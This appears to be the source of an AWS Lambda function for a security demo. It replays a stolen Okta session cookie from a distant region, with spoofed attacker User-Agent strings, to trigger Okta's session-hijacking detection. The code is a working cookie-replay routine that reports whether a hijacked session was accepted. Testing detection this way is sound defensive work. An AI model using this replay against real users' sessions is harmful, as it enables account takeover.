"""
Lambda handler for ITP session cookie replay (the "attacker").

=============================================================================
PURPOSE
=============================================================================
This Lambda function simulates an attacker who has stolen an Okta session
cookie and is replaying it from a different geographic location. When Okta
sees the same session cookie used from two different IPs/regions
simultaneously, it triggers a "Session hijacking detected" event in the
system log and (depending on the entity risk policy) can revoke the session,
force MFA, or take other remediation actions.

This is deployed to a region far from the victim (e.g., eu-west-1 when the
victim is in us-east-2) to maximize the geographic distance and make the
detection more obvious in the demo.

=============================================================================
HOW IT WORKS
=============================================================================
1. The orchestrator (trigger_itp_demo.py) authenticates as the victim user
   via Playwright in the primary region, extracting the session cookie (idx).

2. The orchestrator waits a few seconds for Okta to register the session,
   then invokes this Lambda with the stolen cookie.

3. This Lambda replays the cookie against the Okta dashboard from its own
   region (different IP, different geography), using a different User-Agent
   to further differentiate the "attacker" from the "victim."

4. Okta's session risk engine detects the anomaly (same cookie, different
   IP/location/device fingerprint) and raises a risk event.

5. The entity risk policy evaluates the event and triggers the configured
   action (e.g., UNIVERSAL_LOGOUT to terminate all sessions).

=============================================================================
WHY LAMBDA?
=============================================================================
We need the replay to originate from a DIFFERENT IP address than the victim's
machine. The simplest way to get a guaranteed-different IP in a specific
geographic region is to run the replay from a Lambda function deployed in
that region. No VPN, no proxy, no EC2 instance to manage.

=============================================================================
DEPLOYMENT
=============================================================================
- Deployed via Terraform (see ../main.tf)
- Uses only Python stdlib (no layers or external packages needed)
- Invoked by trigger_itp_demo.py via boto3 Lambda.invoke()
- Typical execution time: 1-3 seconds
- Memory: 128 MB (default) is sufficient

=============================================================================
IMPORTANT: FOLLOW REDIRECTS ARE INTENTIONALLY DISABLED
=============================================================================
We use a NoRedirect handler to capture the HTTP response code WITHOUT
following redirects. This is critical because:

- A successful cookie replay returns 302 (redirect to dashboard) -- this
  means Okta accepted the session and the detection will fire.
- A failed replay returns 302 to the login page or 401 -- the cookie was
  rejected (expired, revoked, etc.).

If we followed redirects, we'd get a 200 for both cases and couldn't
distinguish success from failure.
"""

import json
import urllib.request
import urllib.error


# =============================================================================
# Attacker User-Agent strings
# =============================================================================
# These deliberately differ from what a real user's browser would send.
# The mismatch between the victim's UA and the attacker's UA is one of the
# signals Okta uses for session hijacking detection. Using a different
# browser family (e.g., victim on Chrome, attacker on Firefox) produces the
# strongest signal.
#
# The orchestrator selects which UA to use via the user_agent_index parameter.
# By default it uses index 0 (Chrome on Windows), which differs from most
# Playwright sessions (which use a Chromium-based UA with a different version).
ATTACKER_USER_AGENTS = [
    # Chrome on Windows (most common browser -- looks like a normal attacker)
    (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/121.0.0.0 Safari/537.36"
    ),
    # Firefox on Linux (different browser engine -- strong signal)
    (
        "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) "
        "Gecko/20100101 Firefox/122.0"
    ),
    # Edge on Windows (Chromium-based but different brand -- moderate signal)
    (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0"
    ),
]


class NoRedirect(urllib.request.HTTPRedirectHandler):
    """Custom URL opener that captures redirects instead of following them.

    When Okta receives a valid session cookie on /app/UserHome, it returns
    a 302 redirect to the dashboard. Without this handler, Python's urllib
    would silently follow the redirect and we'd lose the 302 status code
    that tells us the replay was accepted.
    """
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        # Returning None tells urllib to stop and raise an HTTPError with
        # the redirect's status code, which we catch in the handler below.
        return None


def handler(event, context):
    """
    AWS Lambda entry point for cross-region cookie replay.

    Parameters
    ----------
    event : dict
        Invocation payload from the orchestrator. Required fields:
        - cookie (str):      The stolen session cookie value (e.g., the idx token)
        - okta_domain (str): The Okta org domain (e.g., "yourorg.okta.com")

        Optional fields:
        - cookie_name (str):      Cookie name, defaults to "idx"
        - user_agent_index (int): Index into ATTACKER_USER_AGENTS, defaults to 0

    context : LambdaContext
        AWS Lambda context object. Used to extract the Lambda's region and
        request ID for logging and response metadata.

    Returns
    -------
    dict
        On success:
            {
                "status": "success",
                "http_code": 302,            # 302 = cookie accepted (session hijack detected)
                "redirect_url": "https://...",
                "lambda_region": "eu-west-1",
                "lambda_request_id": "abc-123"
            }
        On error:
            {
                "status": "error",
                "error": "description of what went wrong",
                "lambda_region": "eu-west-1"
            }

    Notes
    -----
    HTTP response codes to expect:
    - 302 to /app/UserHome or /enduser/... -> cookie was ACCEPTED (good -- detection will fire)
    - 302 to /login/login.htm             -> cookie was REJECTED (expired or already revoked)
    - 401                                 -> cookie was REJECTED
    - 403                                 -> IP blocked or rate limited
    """
    # -------------------------------------------------------------------------
    # Parse the invocation payload
    # -------------------------------------------------------------------------
    cookie_name = event.get("cookie_name", "idx")
    cookie_value = event.get("cookie")
    okta_domain = event.get("okta_domain")
    ua_index = event.get("user_agent_index", 0)

    # Validate required fields
    if not cookie_value or not okta_domain:
        return {
            "status": "error",
            "error": "cookie and okta_domain are required"
        }

    # -------------------------------------------------------------------------
    # Build the replay request
    # -------------------------------------------------------------------------
    # We hit /app/UserHome because it's a page that requires a valid session.
    # If the cookie is accepted, Okta will redirect to the dashboard; if not,
    # it redirects to the login page.
    url = f"https://{okta_domain}/app/UserHome"

    # Pick the attacker's User-Agent (wraps around if index exceeds array length)
    ua = ATTACKER_USER_AGENTS[ua_index % len(ATTACKER_USER_AGENTS)]

    print(f"Replaying {cookie_name} cookie against {okta_domain}")
    print(f"User-Agent: {ua[:60]}...")

    try:
        # Build the HTTP request with the stolen cookie and attacker UA
        req = urllib.request.Request(url)
        req.add_header("User-Agent", ua)
        req.add_header("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
        req.add_header("Accept-Language", "en-US,en;q=0.5")
        req.add_header("Cookie", f"{cookie_name}={cookie_value}")

        # Use our custom opener that captures redirects instead of following them
        opener = urllib.request.build_opener(NoRedirect)

        # -----------------------------------------------------------------
        # Execute the replay
        # -----------------------------------------------------------------
        # If no redirect occurs, we get the response directly.
        # If a redirect occurs, NoRedirect causes an HTTPError with the
        # 3xx status code, which we catch and extract the Location header.
        try:
            response = opener.open(req, timeout=15)
            http_code = response.getcode()
            redirect_url = ""
        except urllib.error.HTTPError as e:
            # This is the EXPECTED path for a successful replay -- Okta
            # responds with 302 and our NoRedirect handler turns it into
            # an HTTPError so we can capture the redirect URL.
            http_code = e.code
            redirect_url = e.headers.get("Location", "")

        # -----------------------------------------------------------------
        # Build the response
        # -----------------------------------------------------------------
        result = {
            "status": "success",
            "http_code": http_code,
            "redirect_url": redirect_url,
        }

        # Include Lambda execution metadata so the orchestrator can log
        # which region the "attack" came from
        if context:
            result["lambda_region"] = context.invoked_function_arn.split(":")[3]
            result["lambda_request_id"] = context.aws_request_id

        print(f"Result: HTTP {http_code}")
        return result

    except Exception as e:
        # Catch-all for network errors, DNS failures, timeouts, etc.
        return {
            "status": "error",
            "error": str(e),
            "lambda_region": context.invoked_function_arn.split(":")[3] if context else "unknown",
        }
